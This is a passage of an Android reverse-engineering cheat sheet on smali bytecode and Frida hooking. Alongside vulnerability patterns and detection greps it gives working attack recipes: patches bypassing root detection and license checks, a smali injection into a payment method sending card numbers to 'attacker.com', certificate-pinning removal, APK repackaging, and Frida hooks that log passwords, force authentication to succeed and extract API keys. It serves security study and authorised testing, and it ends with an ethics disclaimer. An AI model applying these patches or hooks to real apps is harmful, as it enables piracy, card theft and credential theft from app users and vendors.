move-result v2  # v2 = user_id
```

### 6.2 SharedPreferences Access

```smali
# Get SharedPreferences instance
const-string v1, "auth_prefs"
invoke-virtual {p0, v1, p2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
move-result-object v0  # v0 = SharedPreferences

# Read value
const-string v1, "api_token"
const-string v2, ""  # default
invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
move-result-object v3  # v3 = token

# Write value
invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
move-result-object v1
const-string v2, "api_token"
const-string v3, "new_token_value"
invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V
```

### 6.3 SQLite Database Operations

```smali
# Get writable database
invoke-virtual {v0}, Lcom/example/DbHelper;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;
move-result-object v1  # v1 = SQLiteDatabase

# Query with parameters (SAFE - parameterized)
const-string v2, "users"
const/4 v3, 0x1
new-array v4, v3, [Ljava/lang/String;
const-string v5, "john@example.com"
aput-object v5, v4, p2
invoke-virtual {v1, v2, p3, v4, p4, p5, p6, p7}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
move-result-object v2

# ⚠️ Vulnerable: String concatenation SQL injection
const-string v2, "SELECT * FROM users WHERE email = '"
invoke-virtual {v3}, Ljava/lang/String;->toString()Ljava/lang/String;
move-result-object v4
invoke-static {v2, v4}, Ljava/lang/String;->concat(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
move-result-object v2
const-string v3, "'"
invoke-static {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
move-result-object v2
invoke-virtual {v1, v2}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
# ⚠️ If v3 contains: ' OR '1'='1 → SQL injection!
```

### 6.4 WebView & JavaScriptInterface

```smali
# WebView setup
const v0, 0x7f0900ab
invoke-virtual {p0, v0}, Lcom/example/Activity;->findViewById(I)Landroid/view/View;
move-result-object v0
check-cast v0, Landroid/webkit/WebView;

# ⚠️ Dangerous configuration
invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
move-result-object v1
const/4 v2, 0x1
invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V  # Enable JS

# ⚠️ RCE vector: JavaScriptInterface
new-instance v2, Lcom/example/JsInterface;
invoke-direct {v2, p0}, Lcom/example/JsInterface;-><init>(Landroid/content/Context;)V
const-string v3, "Android"
invoke-virtual {v0, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

# Load URL
const-string v1, "https://example.com"
invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
```

### 6.5 Network Requests (OkHttp Example)

```smali
# Build OkHttpClient
new-instance v0, Lokhttp3/OkHttpClient$Builder;
invoke-direct {v0}, Lokhttp3/OkHttpClient$Builder;-><init>()V
invoke-virtual {v0}, Lokhttp3/OkHttpClient$Builder;->build()Lokhttp3/OkHttpClient;
move-result-object v0  # v0 = client

# Build Request
new-instance v1, Lokhttp3/Request$Builder;
invoke-direct {v1}, Lokhttp3/Request$Builder;-><init>()V
const-string v2, "https://api.example.com/data"
invoke-virtual {v1, v2}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;
const-string v2, "Authorization"
const-string v3, "Bearer sk-xxxxx"  # ⚠️ Hardcoded token!
invoke-virtual {v1, v2, v3}, Lokhttp3/Request$Builder;->addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;
invoke-virtual {v1}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;
move-result-object v1  # v1 = request

# Execute
invoke-virtual {v0, v1}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;
move-result-object v2
invoke-interface {v2}, Lokhttp3/Call;->execute()Lokhttp3/Response;
move-result-object v2

# Read response
invoke-virtual {v2}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
move-result-object v3
invoke-virtual {v3}, Lokhttp3/ResponseBody;->string()Ljava/lang/String;
move-result-object v3  # v3 = response JSON
```

---

## 🔹 SECTION 7: VULNERABILITY PATTERNS IN SMALI

### 7.1 Hardcoded Credentials Detection

```smali
# Pattern 1: Direct string assignment
const-string v0, "sk-proj-abc123xyz"  # ⚠️ API key
sput-object v0, Lcom/example/Config;->API_KEY:Ljava/lang/String;

# Pattern 2: String concatenation to obfuscate
const-string v0, "pass"
const-string v1, "word123"
invoke-static {v0, v1}, Ljava/lang/String;->concat(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
move-result-object v0  # "password123"
sput-object v0, Lcom/example/Auth;->PASSWORD:Ljava/lang/String;

# Pattern 3: Base64 encoded
const-string v0, "cGFzc3dvcmQxMjM="
invoke-static {v0, p1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
move-result-object v0
new-instance v1, Ljava/lang/String;
invoke-direct {v1, v0}, Ljava/lang/String;-><init>([B)V
move-result-object v0  # Decoded password

# Pattern 4: Character array assembly
const/16 v0, 0x70  # 'p'
const/16 v1, 0x61  # 'a'
# ... more chars
# Then assemble into String

# 🔍 Search commands:
grep -r "const-string.*[a-zA-Z0-9_-]\{20,\}" smali/  # Long strings
grep -r "Base64.*decode" smali/  # Base64 usage
grep -r "putString.*password\|token\|key" smali/  # SharedPreferences with sensitive keys
strings app.apk | grep -E "sk-|Bearer|api_key|password"  # From APK directly
```

### 7.2 Insecure Logging

```smali
# Pattern: Logging sensitive data
const-string v1, "Auth"
invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
move-result-object v2
invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I  # ⚠️ Logs token

# Pattern: Logging full response
invoke-virtual {v0}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;
move-result-object v1
invoke-virtual {v1}, Lokhttp3/ResponseBody;->string()Ljava/lang/String;
move-result-object v1
const-string v2, "API"
invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I  # ⚠️ Logs PII

# 🔍 Detection:
grep -r "Log\.\(d\|e\|i\|v\|w\).*token\|password\|secret" smali/
adb logcat | grep -i "com.yourapp" | grep -i "token\|password"
```

### 7.3 SQL Injection via String Concatenation

```java
// Java vulnerable code
String query = "SELECT * FROM users WHERE email = '" + userEmail + "'";
```

```smali
# Smali vulnerable pattern
const-string v0, "SELECT * FROM users WHERE email = '"
invoke-virtual {v1}, Ljava/lang/String;->toString()Ljava/lang/String;  # userEmail
move-result-object v2
invoke-static {v0, v2}, Ljava/lang/String;->concat(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
move-result-object v0
const-string v2, "'"
invoke-static {v0, v2}, Ljava/lang/String;->concat(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
move-result-object v0  # Final query
invoke-virtual {v3, v0}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

# ⚠️ If userEmail = ' OR '1'='1 → Bypasses auth!

# ✅ Secure pattern (parameterized):
const-string v0, "SELECT * FROM users WHERE email = ?"
const/4 v1, 0x1
new-array v2, v1, [Ljava/lang/String;
aput-object v3, v2, p2  # v3 = userEmail (as parameter, not concatenated)
invoke-virtual {v4, v0, v2}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
```

### 7.4 Path Traversal in File Operations

```smali
# Vulnerable: Using user input directly in file path
invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;  # filename from intent
move-result-object v1
new-instance v2, Ljava/io/File;
const-string v3, "/sdcard/downloads/"
invoke-static {v3, v1}, Ljava/lang/String;->concat(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
move-result-object v3
invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V  # ⚠️ No sanitization!

# If filename = "../../../etc/passwd" → Reads system file!

# ✅ Secure pattern:
invoke-static {v1}, Landroid/webkit/URLUtil;->isValidFileName(Ljava/lang/String;)Z
move-result v2
if-eqz v2, :invalid_filename  # Reject invalid names

# Or use File.getName() to strip path:
new-instance v2, Ljava/io/File;
invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
invoke-virtual {v2}, Ljava/io/File;->getName()Ljava/lang/String;  # Gets only filename
move-result-object v1
# Then concatenate with safe directory
```

### 7.5 Intent Injection Vectors

```smali
# Vulnerable: Implicit intent without validation
new-instance v0, Landroid/content/Intent;
const-string v1, "android.intent.action.VIEW"
invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
invoke-virtual {v0, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;  # User-controlled URI
invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
# ⚠️ Attacker can register malicious app for the URI scheme!

# Vulnerable: Exported activity without permission check
# In AndroidManifest.xml:
# <activity android:name=".AdminPanel" android:exported="true" />
# Any app can launch it with malicious extras

# ✅ Secure: Validate intent source
invoke-virtual {p0}, Landroid/app/Activity;->getCallingPackage()Ljava/lang/String;
move-result-object v0
if-eqz v0, :reject_external  # Null = launched from outside

const-string v1, "com.trusted.admin"
invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
move-result v0
if-eqz v0, :reject_external  # Not from trusted package

:reject_external
invoke-virtual {p0}, Landroid/app/Activity;->finish()V
return-void
```

---

## 🔹 SECTION 8: SMALI MODIFICATION FOR EXPLOITATION

### 8.1 Patching Conditional Checks

#### Bypass Root Detection
```smali
# Original root check
.method private isDeviceRooted()Z
    .registers 2
    # ... checks for su binary, test-keys, etc.
    if-eqz v0, :not_root  # if (checkFailed) goto not_root
    const/4 v0, 0x1       # return true (rooted)
    return v0
    :not_root
    const/4 v0, 0x0       # return false (not rooted)
    return v0
.end method

# Patched: Always return false
.method private isDeviceRooted()Z
    .registers 1
    const/4 v0, 0x0       # Always "not rooted"
    return v0
.end method

# Or simpler: Just change the conditional
# if-eqz v0, :not_root  →  if-nez v0, :not_root  (invert logic)
```

#### Bypass License Check
```smali
# Original
invoke-virtual {v0}, Lcom/example/License;->isValid()Z
move-result v0
if-eqz v0, :show_purchase  # if (!valid) show purchase

# Patched option 1: Invert condition
if-nez v0, :show_purchase  # Now only shows purchase if valid (backwards!)

# Patched option 2: Force true
const/4 v0, 0x1  # Always "valid"
# Then remove or bypass the conditional branch

# Patched option 3: NOP the branch
# Replace: if-eqz v0, :show_purchase
# With: nop (or just remove the line and adjust labels)
```

### 8.2 Injecting Logging/Exfiltration

```smali
# Original method
.method public processPayment(Ljava/lang/String;)Z
    .registers 3
    .param p1, "cardNumber"
    # ... payment logic
    invoke-virtual {v0, v1}, Lcom/example/Payment;->charge(Ljava/lang/String;)Z
    move-result v0
    return v0
.end method

# Injected: Log card number to external server
.method public processPayment(Ljava/lang/String;)Z
    .registers 4  # Increased register count
    .param p1, "cardNumber"
    
    # === INJECTED CODE START ===
    # Send card number to attacker server
    new-instance v2, Lokhttp3/OkHttpClient$Builder;
    invoke-direct {v2}, Lokhttp3/OkHttpClient$Builder;-><init>()V
    invoke-virtual {v2}, Lokhttp3/OkHttpClient$Builder;->build()Lokhttp3/OkHttpClient;
    move-result-object v2
    
    new-instance v3, Lokhttp3/Request$Builder;
    invoke-direct {v3}, Lokhttp3/Request$Builder;-><init>()V
    const-string v0, "https://attacker.com/log"
    invoke-virtual {v3, v0}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;
    const-string v0, "POST"
    invoke-virtual {v3, v0}, Lokhttp3/Request$Builder;->method(Ljava/lang/String;Lokhttp3/RequestBody;)Lokhttp3/Request$Builder;
    # ... build request with p1 (cardNumber) in body
    # ... execute request (fire-and-forget, don't wait)
    # === INJECTED CODE END ===
    
    # Original logic continues
    invoke-virtual {v0, v1}, Lcom/example/Payment;->charge(Ljava/lang/String;)Z
    move-result v0
    return v0
.end method
```

### 8.3 Removing Certificate Pinning

```smali
# Find OkHttp CertificatePinner usage
grep -r "CertificatePinner" smali/

# Original pinning setup
new-instance v0, Lokhttp3/CertificatePinner$Builder;
invoke-direct {v0}, Lokhttp3/CertificatePinner$Builder;-><init>()V
const-string v1, "api.example.com"
const-string v2, "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
invoke-virtual {v0, v1, v2}, Lokhttp3/CertificatePinner$Builder;->add(Ljava/lang/String;[Ljava/lang/String;)Lokhttp3/CertificatePinner$Builder;
# ... more pins
invoke-virtual {v0}, Lokhttp3/CertificatePinner$Builder;->build()Lokhttp3/CertificatePinner;
move-result-object v0

# Patching options:

# Option 1: Remove the entire pinning setup
# Delete all lines related to CertificatePinner$Builder
# Remove .certificatePinner(pinner) from OkHttpClient.Builder

# Option 2: Replace with empty pinner
# Keep the structure but add no pins:
new-instance v0, Lokhttp3/CertificatePinner$Builder;
invoke-direct {v0}, Lokhttp3/CertificatePinner$Builder;-><init>()V
invoke-virtual {v0}, Lokhttp3/CertificatePinner$Builder;->build()Lokhttp3/CertificatePinner;  # Empty!
move-result-object v0

# Option 3: Hook dynamically with Frida instead of patching (safer)
```

### 8.4 Repackaging & Resigning Workflow

```bash
# 1. Decode APK
apktool d original.apk -o decoded_app

# 2. Modify Smali files
# Edit decoded_app/smali/.../*.smali with your changes

# 3. Rebuild APK
apktool b decoded_app -o modified_unsigned.apk

# 4. Sign the APK
# Generate keystore if needed:
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

# Sign with apksigner (Android SDK)
apksigner sign --ks my-release-key.keystore --out modified.apk modified_unsigned.apk

# Or with jarsigner (older method):
jarsigner -verbose -keystore my-release-key.keystore -signedjar modified.apk modified_unsigned.apk alias_name

# 5. Verify signature
apksigner verify modified.apk

# 6. Install on device
adb install -r modified.apk

# ⚠️ Note: Many apps detect repackaging via:
# - Signature mismatch checks
# - Integrity verification (SafetyNet/Play Integrity)
# - Checksum validation of APK files
# You may need to patch these checks too!
```

---

## 🔹 SECTION 9: FRIDA HOOKING REFERENCE

### 9.1 Basic Method Hooking

```javascript
// Hook instance method
Java.perform(function() {
    var TargetClass = Java.use("com.example.app.AuthManager");
    
    TargetClass.login.implementation = function(username, password) {
        console.log("[*] login() called!");
        console.log("  Username: " + username);
        console.log("  Password: " + password);
        
        // Call original method
        var result = this.login(username, password);
        
        console.log("  Return: " + result);
        return result;
    };
});
```

### 9.2 Hooking Overloaded Methods

```javascript
Java.perform(function() {
    var StringClass = Java.use("java.lang.String");
    
    // Hook specific overload by signature
    StringClass.substring.overload('int').implementation = function(start) {
        console.log("[*] substring(int) called with start=" + start);
        return this.substring(start);
    };
    
    StringClass.substring.overload('int', 'int').implementation = function(start, end) {
        console.log("[*] substring(int,int) called: " + start + "-" + end);
        return this.substring(start, end);
    };
});
```

### 9.3 Hooking Constructors

```javascript
Java.perform(function() {
    var HttpUrl = Java.use("okhttp3.HttpUrl$Builder");
    
    HttpUrl.$init.overload('java.lang.String').implementation = function(url) {
        console.log("[*] Building request to: " + url);
        return this.$init(url);
    };
});
```

### 9.4 Hooking Static Methods

```javascript
Java.perform(function() {
    var Base64 = Java.use("android.util.Base64");
    
    Base64.encodeToString.overload('[B', 'int').implementation = function(data, flags) {
        console.log("[*] Base64 encoding " + data.length + " bytes");
        var result = this.encodeToString(data, flags);
        console.log("  Result: " + result);
        return result;
    };
});
```

### 9.5 Hooking by Smali Method Descriptor

```javascript
// When you know the exact Smali signature:
// Java: boolean verify(String token, int userId)
// Smali: verify(Ljava/lang/String;I)Z

Java.perform(function() {
    var Auth = Java.use("com.example.Auth");
    
    Auth.verify.implementation = function(token, userId) {
        // Log and bypass
        console.log("[*] verify() bypassed!");
        return true;  // Always return success
    };
});
```

### 9.6 Enumerating All Methods in Class

```javascript
Java.perform(function() {
    var target = "com.example.app";
    
    Java.enumerateLoadedClasses({
        onMatch: function(name) {
            if (name.indexOf(target) === 0) {
                console.log("[+] Class: " + name);
                try {
                    var clazz = Java.use(name);
                    var methods = clazz.class.getDeclaredMethods();
                    methods.forEach(function(m) {
                        console.log("  ├─ " + m.getName() + 
                                   "(" + Array.from(m.getParameterTypes()).map(t=>t.getSimpleName()).join(",") + 
                                   "):" + m.getReturnType().getSimpleName());
                    });
                } catch(e) {}
            }
        },
        onComplete: function() {
            console.log("[*] Enumeration complete");
        }
    });
});
```

---

## 🔹 SECTION 10: QUICK REFERENCE TABLES

### 10.1 Complete Opcode Table (Alphabetical)

| Opcode | Format | Category | Description |
|--------|--------|----------|-------------|
| `add-int` | `add-int vx, vy, vz` | Arithmetic | vx = vy + vz |
| `add-int/lit8` | `add-int/lit8 vx, vy, lit8` | Arithmetic | vx = vy + 8-bit literal |
| `aget` | `aget vx, vy, vz` | Array | vx = ((int[])vy)[vz] |
| `and-int` | `and-int vx, vy, vz` | Bitwise | vx = vy & vz |
| `array-length` | `array-length vx, vy` | Array | vx = vy.length |
| `check-cast` | `check-cast vx, vy, type` | Type | vx = (Type)vy; throw if fail |
| `cmp-long` | `cmp-long vx, vy, vz` | Compare | vx = compare(vy, vz) for longs |
| `const-string` | `const-string vx, string` | Constant | vx = string from pool |
| `const/4` | `const/4 vx, lit4` | Constant | vx = 4-bit literal |
| `div-int` | `div-int vx, vy, vz` | Arithmetic | vx = vy / vz |
| `fill-array-data` | `fill-array-data vx, array-data` | Array | Fill array with static data |
| `goto` | `goto :label` | Branch | Unconditional jump |
| `if-eq` | `if-eq vx, vy, :label` | Branch | Jump if vx == vy |
| `if-eqz` | `if-eqz vx, :label` | Branch | Jump if vx == 0 |
| `iget` | `iget vx, vy, field` | Field | vx = vy.field (instance) |
| `instance-of` | `instance-of vx, vy, type` | Type | vx = (vy instanceof Type) ? 1 : 0 |
| `invoke-static` | `invoke-static {args}, method` | Invoke | Call static method |
| `invoke-virtual` | `invoke-virtual {args}, method` | Invoke | Call instance method |
| `iput` | `iput vx, vy, field` | Field | vy.field = vx (instance) |
| `move` | `move vx, vy` | Move | vx = vy |
| `move-object` | `move-object vx, vy` | Move | vx = vy (object ref) |
| `mul-int` | `mul-int vx, vy, vz` | Arithmetic | vx = vy * vz |
| `new-array` | `new-array vx, vy, type` | Object | vx = new Type[vy] |
| `new-instance` | `new-instance vx, type` | Object | vx = new Type() |
| `nop` | `nop` | No-op | Do nothing (for patching) |
| `not-int` | `not-int vx, vy` | Bitwise | vx = ~vy |
| `or-int` | `or-int vx, vy, vz` | Bitwise | vx = vy \| vz |
| `packed-switch` | `packed-switch vx, :data` | Branch | Jump table for sequential cases |
| `rem-int` | `rem-int vx, vy, vz` | Arithmetic | vx = vy % vz |
| `return` | `return vx` | Return | Return 32-bit value |
| `return-object` | `return-object vx` | Return | Return object reference |
| `return-void` | `return-void` | Return | Return from void method |
| `sget` | `sget vx, field` | Field | vx = Class.field (static) |
| `shl-int` | `shl-int vx, vy, vz` | Bitwise | vx = vy << vz |
| `shr-int` | `shr-int vx, vy, vz` | Bitwise | vx = vy >> vz (sign-extend) |
| `sparse-switch` | `sparse-switch vx, :data` | Branch | Jump table for arbitrary cases |
| `sput` | `sput vx, field` | Field | Class.field = vx (static) |
| `sub-int` | `sub-int vx, vy, vz` | Arithmetic | vx = vy - vz |
| `throw` | `throw vx` | Exception | throw (Exception)vx |
| `ushr-int` | `ushr-int vx, vy, vz` | Bitwise | vx = vy >>> vz (zero-extend) |
| `xor-int` | `xor-int vx, vy, vz` | Bitwise | vx = vy ^ vz |

### 10.2 Type Descriptor Cheat Sheet

```
PRIMITIVES:
Z = boolean    B = byte    S = short    C = char
I = int        J = long    F = float    D = double
V = void       (return type only)

REFERENCES:
Lfully/qualified/ClassName;  (note: forward slashes, ends with semicolon)
Examples:
  Ljava/lang/String;
  Landroid/content/Context;
  Lcom/example/app/MainActivity;

ARRAYS:
[Type  (prefix with [ for each dimension)
Examples:
  [I = int[]
  [[I = int[][]
  [Ljava/lang/String; = String[]
  [[Lcom/example/Data; = Data[][]

METHOD SIGNATURES:
(param1Typeparam2Type...)ReturnType
Examples:
  ()V = void method()
  (I)V = void method(int)
  (Ljava/lang/String;I)Ljava/lang/String; = String method(String, int)
  ([B)Ljava/lang/String; = String method(byte[])

FIELD SIGNATURES:
fieldName:FieldType
Examples:
  counter:I
  name:Ljava/lang/String;
  items:[Lcom/example/Item;
```

### 10.3 Register Convention Summary

```
LOCAL REGISTERS (declared in .registers):
v0, v1, v2, ... vN  (N depends on .registers directive)

PARAMETER REGISTERS (NOT counted in .registers):
Instance method: p0=this, p1=param1, p2=param2...
Static method:   p0=param1, p1=param2... (no 'this')

WIDE TYPES (long/double):
Use TWO consecutive registers:
  v0+v1 hold one long/double value
  move-wide v2, v0 copies v0+v1 to v2+v3

REGISTER COUNT EXAMPLE:
.method public example(IIJ)V
    .registers 3    # Declares 3 LOCAL registers: v0, v1, v2
    # Parameters: p0=this, p1=int1, p2=int2, p3+p4=long (wide!)
    # Available: v0-v2 (locals) + p0-p4 (params)
    # Total registers in use: 3 locals + 5 param slots = 8 register slots
```

### 10.4 Common Pattern Snippets

```smali
# String comparison
invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
move-result v0
if-eqz v0, :not_equal

# Null check
if-eqz v0, :is_null  # if (v0 == null)

# Array iteration
const/4 v1, 0                    # i = 0
:loop
array-length v2, v0              # v2 = array.length
if-ge v1, v2, :loop_end          # if (i >= length) break
aget-object v3, v0, v1           # v3 = array[i]
# ... process v3 ...
add-int/lit8 v1, v1, 1           # i++
goto :loop
:loop_end

# Try-catch skeleton
.try_start :try_begin
    # Risky operation
    invoke-virtual {v0}, Lcom/example/Risky;->doIt()V
.try_end :try_begin
.catch Ljava/lang/Exception; {:try_begin .. :try_end} :catch_handler

:catch_handler
    move-exception v0
    # Handle exception
    return-void
```

---

## 🔹 SECTION 11: REAL-WORLD EXAMPLES

### 11.1 Example: Bypassing Root Detection

**Original Smali (simplified):**
```smali
.method private checkRoot()Z
    .registers 3
    const-string v0, "/system/xbin/su"
    new-instance v1, Ljava/io/File;
    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/io/File;->exists()Z
    move-result v1
    if-eqz v1, :not_found
    const/4 v0, 0x1
    return v0
    :not_found
    const/4 v0, 0x0
    return v0
.end method
```

**Patched Version (always return false):**
```smali
.method private checkRoot()Z
    .registers 1
    const/4 v0, 0x0  # Always "not rooted"
    return v0
.end method
```

**Alternative: Frida Hook (no repackaging needed):**
```javascript
Java.perform(function() {
    var AppUtils = Java.use("com.example.app.Utils");
    AppUtils.checkRoot.implementation = function() {
        console.log("[*] Root check bypassed!");
        return false;
    };
});
```

### 11.2 Example: Extracting Hardcoded API Key

**Finding the key:**
```bash
# Search for long strings in Smali
grep -r "const-string.*[a-zA-Z0-9_-]\{30,\}" smali/

# Or search for common key patterns
grep -r "const-string.*sk-\|Bearer\|api_key\|secret" smali/ -i

# Found:
# smali/com/example/Config.smali:    const-string v0, "sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz123456"
```

**Extracting at runtime with Frida:**
```javascript
Java.perform(function() {
    var Config = Java.use("com.example.Config");
    
    // Hook the static field getter
    var API_KEY_field = Config.class.getDeclaredField("API_KEY");
    API_KEY_field.setAccessible(true);
    var apiKey = API_KEY_field.get(null);
    console.log("[*] Extracted API Key: " + apiKey);
    
    // Or hook the method that uses it
    Config.makeRequest.implementation = function(endpoint) {
        var key = Config.API_KEY.value;  // Access static field
        console.log("[*] Request with key: " + key.substring(0, 10) + "...");
        return this.makeRequest(endpoint);
    };
});
```

### 11.3 Example: Modifying License Check

**Original logic:**
```smali
.method public verifyLicense(Ljava/lang/String;)Z
    .registers 3
    # Complex cryptographic verification...
    invoke-static {v0, v1}, Lcom/example/Crypto;->verifySignature(Ljava/lang/String;Ljava/lang/String;)Z
    move-result v0
    if-eqz v0, :invalid  # if (!valid) goto invalid
    const/4 v0, 0x1
    return v0
    :invalid
    const/4 v0, 0x0
    return v0
.end method
```

**Patch 1: Always return true**
```smali
.method public verifyLicense(Ljava/lang/String;)Z
    .registers 1
    const/4 v0, 0x1  # Always valid!
    return v0
.end method
```

**Patch 2: Invert the condition**
```smali
# Change: if-eqz v0, :invalid  →  if-nez v0, :invalid
# Now it returns true when verification FAILS (logic bug!)
```

**Patch 3: NOP the check**
```smali
# Replace the invoke-static + move-result + if-eqz with nops:
nop
nop
nop
# Then force the success path
const/4 v0, 0x1
return v0
```

---

## 🔹 SECTION 12: TROUBLESHOOTING

### 12.1 Common Smali Errors

| Error | Cause | Fix |
|-------|-------|-----|
| `Register v5 out of range (0-3)` | Using register beyond `.registers` count | Increase `.registers N` or use lower register numbers |
| `Wide register pair misaligned` | Using v1 for long when v0+v1 needed | Use even register numbers for wide types: v0, v2, v4... |
| `Label not defined` | Branching to non-existent label | Check label spelling and ensure it's defined in method |
| `Method signature mismatch` | Hooking wrong overload in Frida | Use `.overload(...)` with exact parameter types |
| `APK verification failed` | Signature mismatch after repackaging | Properly sign with apksigner, or patch signature checks |
| `Class not found` | Obfuscated class name | Use jadx to find real class name, or enumerate at runtime |

### 12.2 Debugging Repackaged APKs

```bash
# Enable Smali debugging (if app is debuggable)
adb shell setprop debug.app.com.example 1

# Monitor for crashes
adb logcat | grep -i "fatal\|exception\|com.example"

# Check if app detects repackaging
adb logcat | grep -i "signature\|integrity\|tamper"

# Use Frida to trace execution before crash
frida -U -f com.example.app -l trace.js --no-pause

# trace.js content:
Java.perform(function() {
    console.log("[*] App started");
    // Add hooks for suspected methods
});
```

### 12.3 Handling Verification Errors

```bash
# If apksigner fails:
# 1. Ensure you're using the correct keystore
# 2. Use v1 + v2 + v3 signing schemes:
apksigner sign --ks my.keystore \
  --v1-signing-enabled true \
  --v2-signing-enabled true \
  --v3-signing-enabled true \
  --out signed.apk unsigned.apk

# If app has SafetyNet/Play Integrity:
# You'll need to:
# 1. Patch the integrity check methods
# 2. Use Magisk + modules to hide root
# 3. Or use Frida to bypass at runtime

# If app uses native code verification:
# Check lib/armeabi-v7a/*.so files for checksum routines
# May require patching .so files with Ghidra + ARM assembler
```

---

## 🔹 SECTION 13: REFERENCES & FURTHER LEARNING

### 📚 Official Documentation
- [Dalvik Bytecode Reference](https://source.android.com/docs/core/runtime/dalvik-bytecode)
- [Smali/Baksmali GitHub](https://github.com/JesusFreke/smali)
- [Android App Security Guidelines](https://developer.android.com/topic/security/best-practices)

### 🎓 Learning Resources
- [Android Reverse Engineering for Beginners](https://www.exploit-db.com/docs/english/44102-android-reverse-engineering-101-for-pentesters.pdf)
- [Practical Android Reverse Engineering](https://www.packtpub.com/product/practical-android-reverse-engineering/9781803241791)
- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)

### 🛠️ Tools
- [Apktool](https://ibotpeaches.github.io/Apktool/) - Decode/rebuild APKs
- [jadx](https://github.com/skylot/jadx) - Java decompiler
- [Frida](https://frida.re/) - Dynamic instrumentation
- [JEB Decompiler](https://www.pnfsoftware.com/) - Interactive Smali/Java analysis
- [Ghidra](https://ghidra-sre.org/) - Full-featured reverse engineering suite
- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) - Automated mobile analysis

### 🧪 Practice Apps
- [InsecureBankv2](https://github.com/dineshshetty/Android-InsecureBankv2)
- [GoatDroid](https://github.com/jackMannino/GoatDroid)
- [Android-Insecure-App](https://github.com/payatu/Android-Insecure-App)

### 🗣️ Communities
- [Reverse Engineering Stack Exchange](https://reverseengineering.stackexchange.com/)
- [Reddit r/ReverseEngineering](https://reddit.com/r/ReverseEngineering)
- [Frida Discord](https://discord.gg/frida)
- [OWASP Mobile Slack](https://owasp.org/slack/invite) #mobile channel

---

## ⚠️ ETHICAL DISCLAIMER

> 🔐 **This reference is for educational and authorized security testing purposes only.** 🔐
>
> By using this content, you agree to:
> - ✅ Only test systems you own or have **explicit written authorization** to assess
> - ✅ Follow all applicable local, national, and international laws
> - ✅ Practice **Responsible Disclosure** when discovering vulnerabilities
> - ✅ Never modify or distribute apps without permission from copyright holders
> - ✅ Respect user privacy and data protection regulations
>
> ❌ **DO NOT**:
> - ❌ Modify apps for piracy, cheating, or unauthorized access
> - ❌ Distribute repackaged apps with malicious payloads
> - ❌ Use techniques to circumvent licensing for commercial gain
> - ❌ Attack systems without permission
>
> *When in doubt: ASK FIRST. Get permission IN WRITING.*

